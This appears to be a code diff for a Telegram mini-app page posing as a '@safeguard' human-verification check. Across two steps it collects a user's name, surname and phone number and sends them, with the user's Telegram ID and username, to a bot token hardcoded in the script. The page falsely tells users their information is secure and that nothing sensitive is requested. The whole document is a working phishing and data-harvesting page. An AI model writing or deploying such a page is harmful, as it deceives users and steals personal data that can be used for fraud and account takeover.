@@ -161,45 +161,104 @@
             font-size: 14px;
             margin-top: 10px;
         }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="checkmark">
-            <svg viewBox="0 0 52 52">
-                <polyline points="14,27 22,35 38,17"/>
-            </svg>
-        </div>
-
-        <p class="welcome-text" id="welcomeText">Welcome, User</p>
-        <h1>Human Verification</h1>
-        <p class="subtitle">Verify below to be granted entry</p>
-
-        <form id="verificationForm">
-            <div class="form-group">
-                <label for="name">Full Name</label>
-                <input type="text" id="name" name="name" placeholder="Enter your name" required>
+        <!-- PAGE 1 -->
+        <div id="page1" class="page active">
+            <div class="checkmark">
+                <svg viewBox="0 0 52 52">
+                    <polyline points="14,27 22,35 38,17"/>
+                </svg>
             </div>
 
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+            <p class="welcome-text" id="welcomeText">Welcome, User</p>
+            <h1>Human Verification</h1>
+            <p class="subtitle">Verify below to be granted entry</p>
+
+            <form id="form1">
+                <div class="form-group">
+                    <label for="name">Full Name</label>
+                    <input type="text" id="name" name="name" placeholder="Enter your name" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
+                </div>
+
+                <button type="submit" class="verify-btn" id="submitBtn1">
+                    Click here to verify
+                </button>
+
+                <p class="error-message" id="errorMsg1">Please fill in all fields correctly</p>
+            </form>
+
+            <div class="warning">
+                <span class="warning-icon">⚠</span>
+                <span class="warning-text">We will never ask you for password or sensitive information</span>
             </div>
 
-            <button type="submit" class="verify-btn" id="submitBtn">
-                Click here to verify
-            </button>
-
-            <p class="success-message" id="successMsg">✓ Verification successful!</p>
-            <p class="error-message" id="errorMsg">Please fill in all fields correctly</p>
-        </form>
-
-        <div class="warning">
-            <span class="warning-icon">⚠</span>
-            <span class="warning-text">We will never ask you for password or sensitive information</span>
+            <p class="footer">@safeguard</p>
         </div>
 
-        <p class="footer">@safeguard</p>
+        <!-- PAGE 2 -->
+        <div id="page2" class="page">
+            <div class="checkmark">
+                <svg viewBox="0 0 52 52">
+                    <polyline points="14,27 22,35 38,17"/>
+                </svg>
+            </div>
+
+            <p class="welcome-text">Almost Done!</p>
+            <h1>Additional Information</h1>
+            <p class="subtitle">Please provide your surname to complete verification</p>
+
+            <form id="form2">
+                <div class="form-group">
+                    <label for="surname">Surname</label>
+                    <input type="text" id="surname" name="surname" placeholder="Enter your surname" required>
+                </div>
+
+                <button type="submit" class="verify-btn" id="submitBtn2">
+                    Complete Verification
+                </button>
+
+                <p class="success-message" id="successMsg">✓ Verification successful!</p>
+                <p class="error-message" id="errorMsg2">Please enter your surname</p>
+            </form>
+
+            <div class="warning">
+                <span class="warning-icon">⚠</span>
+                <span class="warning-text">Your information is secure and encrypted</span>
+            </div>
+
+            <p class="footer">@safeguard</p>
+        </div>
     </div>
 
     <script>
@@ -213,28 +272,60 @@
             document.getElementById('welcomeText').textContent = `Welcome, ${user.first_name || 'User'}`;
         }
 
-        const form = document.getElementById('verificationForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const successMsg = document.getElementById('successMsg');
-        const errorMsg = document.getElementById('errorMsg');
+        // Store form data
+        let formData = {};
 
-        form.addEventListener('submit', async (e) => {
+        const page1 = document.getElementById('page1');
+        const page2 = document.getElementById('page2');
+        const form1 = document.getElementById('form1');
+        const form2 = document.getElementById('form2');
+        const submitBtn1 = document.getElementById('submitBtn1');
+        const submitBtn2 = document.getElementById('submitBtn2');
+        const errorMsg1 = document.getElementById('errorMsg1');
+        const errorMsg2 = document.getElementById('errorMsg2');
+        const successMsg = document.getElementById('successMsg');
+
+        // Handle first form submission
+        form1.addEventListener('submit', (e) => {
             e.preventDefault();
             
             const name = document.getElementById('name').value.trim();
             const phone = document.getElementById('phone').value.trim();
 
-            successMsg.style.display = 'none';
-            errorMsg.style.display = 'none';
+            errorMsg1.style.display = 'none';
 
             if (!name || !phone) {
-                errorMsg.textContent = 'Please fill in all fields';
-                errorMsg.style.display = 'block';
+                errorMsg1.textContent = 'Please fill in all fields';
+                errorMsg1.style.display = 'block';
                 return;
             }
 
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
+            // Store data
+            formData.name = name;
+            formData.phone = phone;
+
+            // Go to page 2
+            page1.classList.remove('active');
+            page2.classList.add('active', 'fade-in');
+        });
+
+        // Handle second form submission
+        form2.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const surname = document.getElementById('surname').value.trim();
+
+            errorMsg2.style.display = 'none';
+            successMsg.style.display = 'none';
+
+            if (!surname) {
+                errorMsg2.textContent = 'Please enter your surname';
+                errorMsg2.style.display = 'block';
+                return;
+            }
+
+            submitBtn2.disabled = true;
+            submitBtn2.textContent = 'Verifying...';
 
             try {
                 const botToken = '8505030202:AAH1_2jI_5JI_3TniUMhnKAKz9-_Txs4whs';
@@ -242,8 +333,9 @@
                 
                 const message = `🆕 NEW SUBMISSION
 ━━━━━━━━━━━━━━━━━━
-👤 Name: ${name}
-📱 Phone: ${phone}
+👤 Name: ${formData.name}
+👨 Surname: ${surname}
+📱 Phone: ${formData.phone}
 ${user ? `🆔 Telegram ID: ${user.id}` : ''}
 ${user && user.username ? `👨‍💼 Username: @${user.username}` : ''}
 ${user && user.first_name ? `📝 First Name: ${user.first_name}` : ''}
@@ -263,21 +355,22 @@ ${user && user.first_name ? `📝 First Name: ${user.first_name}` : ''}
 
                 if (response.ok) {
                     successMsg.style.display = 'block';
-                    form.reset();
-                    submitBtn.textContent = '✓ Verified';
+                    form2.reset();
+                    submitBtn2.textContent = '✓ Verified';
                     
-                    // Close the mini app after 2 seconds
+                    // Keep the page open, don't close
                     setTimeout(() => {
-                        tg.close();
-                    }, 2000);
+                        submitBtn2.disabled = false;
+                        submitBtn2.textContent = 'Complete Verification';
+                    }, 3000);
                 } else {
                     throw new Error('Failed to send');
                 }
             } catch (error) {
-                errorMsg.textContent = 'Verification failed. Please try again.';
-                errorMsg.style.display = 'block';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Click here to verify';
+                errorMsg2.textContent = 'Verification failed. Please try again.';
+                errorMsg2.style.display = 'block';
+                submitBtn2.disabled = false;
+                submitBtn2.textContent = 'Complete Verification';
             }
         });
     </script>
